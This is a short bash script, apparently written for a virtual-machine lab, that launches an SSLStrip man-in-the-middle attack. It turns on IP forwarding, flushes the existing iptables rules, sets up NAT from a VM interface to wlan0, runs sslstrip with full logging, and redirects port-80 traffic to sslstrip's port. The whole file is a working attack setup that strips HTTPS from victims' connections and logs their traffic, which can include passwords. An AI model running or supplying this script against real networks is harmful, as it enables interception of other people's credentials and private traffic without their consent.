#!/bin/bash

########################################
# Run SSLStrip                         #
# usage: ./sslstrip.sh                 #
# developer: ptantiku                  #
########################################

#IN_INT="vboxnet0"
export IN_INT="vmnet8"
export EX_INT="wlan0"
export LISTENPORT=4567

echo 1 > /proc/sys/net/ipv4/ip_forward

## NAT eth0 ----> WLAN0 (internet)
/sbin/iptables --flush
/sbin/iptables -t nat --flush
/sbin/iptables -t nat -A POSTROUTING -o $IN_INT -j MASQUERADE
/sbin/iptables -A FORWARD -i $IN_INT -o $EX_INT -m state --state RELATED,ESTABLISHED -j ACCEPT
/sbin/iptables -A FORWARD -i $EX_INT -o $IN_INT -j ACCEPT

#sslstrip -p -w sslstrip.log -l $LISTENPORT 
sslstrip -a -w sslstrip.log -l $LISTENPORT 

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $LISTENPORT

# tail -F sslstrip.log

